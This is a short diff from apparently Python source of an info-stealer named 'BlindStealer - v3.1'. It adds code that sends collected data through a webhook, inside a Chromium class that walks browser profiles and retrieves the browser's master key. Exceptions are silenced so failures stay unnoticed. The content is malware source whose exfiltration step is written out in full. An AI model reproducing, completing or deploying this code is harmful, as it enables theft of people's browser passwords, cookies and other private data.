@@ -147,7 +147,15 @@ class Chromium:
                         operation(path, profile)
                     except Exception as e:
                         pass
-
+        try:
+            webhook.send(
+                embed=embed,
+                username="BlindStealer - v3.1",
+                avatar_url="https://i.imgur.com/LNVOaxg.png"
+            )
+        except:
+            pass
+            
     def get_master_key(self, path: str) -> str:
         if not os.path.exists(path):
             return
